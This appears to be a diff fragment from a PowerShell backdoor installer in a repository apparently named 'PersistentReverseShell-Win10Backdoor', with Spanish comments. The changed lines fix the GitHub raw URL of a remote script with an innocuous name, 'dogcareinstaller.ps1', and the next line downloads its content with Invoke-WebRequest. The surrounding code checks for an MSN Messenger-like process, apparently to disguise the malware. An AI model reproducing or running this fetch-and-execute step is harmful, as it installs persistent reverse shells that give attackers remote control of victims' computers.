@@ -65,7 +65,7 @@ if ($msnmsgrExists) {
 }
 
 # URL del script alojado en GitHub
-$scriptUrl = "https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/dogcareinstaller"
+$scriptUrl = "https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/dogcareinstaller.ps1"
 
 # Descarga el contenido del script
 $scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
